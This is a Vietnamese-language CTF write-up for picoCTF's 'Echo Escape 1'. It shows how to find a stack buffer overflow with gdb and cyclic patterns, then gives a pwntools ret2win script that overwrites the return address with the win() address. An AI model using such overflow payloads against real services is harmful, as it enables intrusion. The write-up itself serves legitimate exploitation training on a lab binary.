# Writeup: Echo Escape 1 - picoCTF 2026

**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Author:** YAHAYA MEDDY  

## 1. Mô tả Challenge

Challenge là một dịch vụ echo "secure". Khi kết nối qua netcat:

![Mô tả challenge trên picoCTF](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/6845169101721a9f385ee67203574c928e7edf34/pwn1.png)
Kết nối thực tế:

![Kết nối netcat và giao diện ban đầu](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn2.png)

Nhập thử dữ liệu xem chương trình trả ra kết quả gì

![dùng thử chương trình](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn3.png)

**Quan sát:** Chương trình phản hồi lại chuỗi Hello kết hợp với dữ liệu mà chúng ta vừa nhập vào, và đi kèm một thông báo thông báo kết thúc.

## 2. Tải file binary và chuẩn bị
Tải tệp tin thực thi (binary) về môi trường local để tiến hành phân tích kỹ thuật.

![Chi tiết challenge và nút copy link](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn4.png)
*Sao chép đường dẫn tải xuống tệp tin binary.*

![Sử dụng wget tải binary](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn5.png)

*Sử dụng lệnh wget để tải tệp binary về máy.*

![Chạy chmod +x vuln.6](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/chaylocal.png)

*Tiếp theo chúng ta sử dụng câu lệnh chmod +x tên tên file binary để cung cấp quyền chạy trên máy của chúng ta*

---

## 3. Phân tích Source Code

Source code được cung cấp:

![Source code vuln.c](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/sourcecodepwn.png)

Phân tích code một chút chúng ta có thể thấy được chường trình chỉ cho buffer 32 bytes nhưng lại cho người dùng nhập vào tối đa lên đến 128 bytes

Đây là dấu hiệu rõ ràng của Stack Buffer Overflow hay còn được gọi là tràn bộ đệm

Bạn có thể liên tưởng đến một cái ly khi bị rót quá đầy thì nước dần dần sẽ tràn ra khu vực khác và trong thử thách này cũng vậy

Mục tiêu của chúng ta là phải làm sao để khiến cho các bytes dữ liệu của chúng ta ghi đè đúng vào vị trí của hàm win từ đó đọc được flag của thử thách này

![Tên mô tả ảnh](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmEs0fL8NkDoIMjOlkwFWk4YMrjF2YB4YGGw&s)

Đây chính là hình ảnh minh họa cho lỗi tràn bộ đệm mà ta đang khai thác

## 4. Debug với gdb và pwndbg

**Đầu tiên và vô cùng quan trọng chúng ta sử dụng câu lện **"file ./ten_file_binary" để check xem cấu hình của file binary**

Sau khi thực thi lệnh này ta có thể thấy được những thông số cơ bản của file như : Tên, Định dạng file là ELF, Kiến trúc là 64-bit, Sắp xeeos Bytes là LSB, Tập Lệnh là x86-64, và quan trọng nhất là không stripped

Khi file không striped chúng ta có thể dễ dàng tìm thấy các hàm như là 'main', 'win'

![check cau hinh file](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/checkbit.png)

Tiếp theo
Chúng ta quét trương trình bằng gdb bằng lệnh gdb ./ten_file_binary

![Mở vuln.6 bằng gdb](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn7.png)

Chúng ta sử dụng checksec để kiểm tra xem file binary được trang bị những lớp phòng thủ nào
![checksec](https://github.com/Writeup-Challenge-Le-Nam-Thang/Pwn-Picoctf/blob/329acef68c463e8fcea5890be5aaf7223c4897da/checksec.png)

Quá là may mắn !!!!!
Có thể thấy rằng file này không có lớp bảo vệ PIE có nghĩa là hàm địa chỉ của hàm win sẽ ở một vị trí cố định và không thay đổi trong suốt quá trình ta chạy chương trình

![Danh sách functions trong binary](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn8.png)

Việc xem chương trình sử dụng những hàm nòa là vô cùng quan trọng

Chúng ta có thể xem tất cả các hàm qua gdb bằng câu lệnh 'info function'

Sau khi thực thi câu lệnh gdb sẽ hiện ra tất cả các hàm được sử dụng trong khi chạy chương trình


Tiếp theo chúng ta tìm địa chỉ hàm main bằng cách thực thi lệnh p main trong gdb từ đó gdb sẽ quét và tìm rồi đưa ra địa chỉ hàm win cho ta

![Tìm địa chỉ hàm main](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn9.png)

Sau khi quét chúng ta nhận được địa chỉ hàm win:
**win() address = 0x401256**

## 5. Tìm Offset đến Return Address

Như mình phân tích ở trên bài này có rất nhiều dấu hiệu cho thấy rằng khả năng cao là lỗi tràn bộ đêm nên chúng ta sẽ tạo một chuỗi kí tự dài hơn chương trình có thể buf nhằm crash trương trình bằng câu lệnh cyclic
200 nhằm tạo ra 200 kí tự ngẫu nhiên để nhập vào chương trình nhằm khiến chương trình bị crash

![Tạo cyclic pattern 200 bytes](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn10.png)   <!-- pwn10.png -->

Copy chuỗi ký tự và dán vào rồi nhấn enter xem có chuyện gì xảy ra

![Chạy binary với cyclic pattern](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn11.png)
Hehe rất đúng với dự đoán của mình sau khi chạy một chuỗi kí tự dài đã khiến cương trình bị crash và in ra một giá trị bị thừa ra khỏi bảng số liệu của gdb

Đây chính là giá trị của Register RIP (Register Instruction Pointer) tại thời điểm chương trình crash (Segmentation Fault)

![Gía trị của Register RIP](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn12.png)

Tìm offset chính xác:

Offset là gì? 

Chúng ta có thể hiểu nôm na Offset là "khoảng cách" (tính bằng byte) từ điểm bắt đầu của bộ đệm (buffer) cho đến vị trí của địa chỉ trả về (Return Address) trên Stack

Ta sử dụng lệnh cyclic -l + giá_trị_RIP để tìm offset

![Sử dụng cyclic -l tìm offset](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn13.png)   <!-- pwn13.png -->

**Kết quả:** Offset = **40 bytes**

## 6. Viết Exploit Script

Tiếp theo ta là đến bước mình thích nhất và cũng thú vị nhất đó chính là sử dụng thư viện pwntool của python để viết payload dùng để lấy flag

Dưới đây là nội dung file payload của chúng ta

```python
from pwn import *

HOST = "mysterious-sea.picoctf.net" #tên máy chủ
PORT = #mã port trong challenge của bạn #port của máy chủ đó

p = remote(HOST, PORT) #kết nối với máy chủ của challenge

p.recvuntil(b"Please enter your name: ") #chạy chương trình cho đến khi gặp dòng chữ trên sau đó truyền payload ghi ở dưới

offset = 40 # đây là offset mà khi nãy ta dùng lệnh cyclic để tìm
win_addr = 0x401256 #đây là địa chỉ hàm win mà nãy ta đã tìm được

payload = b"A" * offset + p64(win_addr) #đây là nội dung payload nhớ là kiểm tra xem file binary là bao nhiêu bit nếu mà là 32 thì sửa p64 thành p32

p.sendline(payload) #gửi mã độc 
p.interactive() #nhận kết quả
```
Nói qua một chút về payload của mình nhé:

```HOST = "mysterious-sea.picoctf.net" # Tên miền của máy chủ bài Lab
PORT = 12345 # Số hiệu cổng dịch vụ đang chạy bài Lab
p = remote(HOST, PORT) # Mở một kết nối TCP đến máy chủ đó
```
Những dòng code này dùng để thiết lập đường truyền để giao tiếp với máy chủ của thử thách

```p.recvuntil(b"Please enter your name: ")```

Lắng nghe dữ liệu máy chủ gửi về, chờ cho đến khi thấy dòng chữ yêu cầu nhập tên thì mới bắt đầu thực thi mã độc để đảm bảo không gửi dữ liệu quá sớm khi chương trình chưa thực sự nhận dữ liệu

```offset = 40 
win_addr = 0x401256
payload = b"A" * offset + p64(win_addr)
```
Đây là thứ hay ho nhất chính là mã độc của chúng ta

Tôi sẽ giải thích một chút về những dòng mã độc này

b"A" * 40: Tạo ra 40 ký tự rác để lấp đầy bộ đệm (Buffer) và đè qua các biến phụ trên Stack, chạm tới đúng vị trí của hàm win

p64(win_addr): Đổi địa chỉ hàm win (0x401256) sang dạng byte (Little Endian, 64-bit) để máy tính hiểu được (**Lưu ý:** ở trên khi chúng ta kiểm tra cấu hình file thì có ghi là 64-bit nếu khi chúng ta kiểm tra file mà hiện 32-bit thì phải thay p64 bằng p32 nhé !)

sau đó chúng ta sử dụng hai câu lệnh
```
p.sendline(payload) # Gửi chuỗi tấn công đã chuẩn bị lên máy chủ
p.interactive()      # Giữ kết nối mở để bạn có thể gõ lệnh trực tiếp
```
Hai câu lệnh trên dùng để gửi mã độc và sau khi kết thúc cho phép chúng ta đọc Flag mà máy chủ trả về

## 7. Thực thi file payload của bạn để lấy flag
**Lưu ý!!!!: phải để địa chỉ file payload và file binary trong cùng một thư mục**
Sau đó chạy lệnh python3 "tên_file_payload.py" sau đó để file payload làm việc của nó thôi
Cuối cùng sau khi chạy thì sẽ xuất hiện flag của challenge này :

![FLAG](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/flag.png)




